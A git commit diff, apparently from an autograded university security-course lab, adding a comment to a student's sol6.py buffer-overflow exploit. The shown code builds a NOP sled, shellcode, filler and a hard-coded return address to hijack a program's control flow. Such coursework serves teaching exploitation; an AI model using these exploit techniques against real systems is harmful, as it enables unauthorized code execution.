9a1e742287cc9299b6cdeba6d886d551777253a0
eecs388 <adwisi@umich.edu>
2024-11-15 21:34:25 +0000

    Automatic commit by test script for adwisi jrosevel

--- sol6.py
+++ sol6.py
@@ -8,5 +8,7 @@ noop_sled = b'\x90'*970
 filler = b'A' * 8
 
 hacking = noop_sled + shellcode + filler
+
+#estimated beginning address
 return_addr = 0x7ffffff68c00.to_bytes(8, 'little')
 sys.stdout.buffer.write(hacking + return_addr)
